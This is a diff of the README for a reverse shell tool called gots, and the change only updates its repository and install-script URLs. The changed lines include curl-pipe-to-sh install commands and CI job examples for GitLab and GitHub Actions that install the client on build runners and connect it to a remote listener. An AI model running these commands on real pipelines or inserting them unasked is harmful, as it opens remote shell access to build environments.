@@ -10,14 +10,14 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
 
 ## Install
 - Binstaller (recommended):
-  - gotsl (Listener): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsl.sh | sh`
-  - gotsr (Client): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh`
+  - gotsl (Listener): `curl -fsSL https://frjcomp.github.io/gots/install-gotsl.sh | sh`
+  - gotsr (Client): `curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh`
   - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).
 
 - From source:
   ```bash
-  git clone https://github.com/frjcomp/golang-https-rev.git
-  cd golang-https-rev
+  git clone https://github.com/frjcomp/gots.git
+  cd gots
   make build  # outputs to bin/
   ```
 
@@ -87,7 +87,7 @@ When using shared secret authentication, the client automatically validates the 
     image: alpine:3.19
     script:
       - apk add --no-cache curl
-      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
+      - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
       - ~/.local/bin/gotsr listener.example.com:8443 3
   ```
 
@@ -100,7 +100,7 @@ When using shared secret authentication, the client automatically validates the 
       runs-on: ubuntu-latest
       steps:
         - name: Install gotsr client
-          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
+          run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
         - name: Run gotsr
           run: ~/.local/bin/gotsr listener.example.com:8443 3
   ```
@@ -116,7 +116,7 @@ When using shared secret authentication, the client automatically validates the 
         - name: Install gotsr client (PowerShell)
           shell: pwsh
           run: |
-            & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh"
+            & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
         - name: Run gotsr (PowerShell)
           shell: pwsh
           run: |
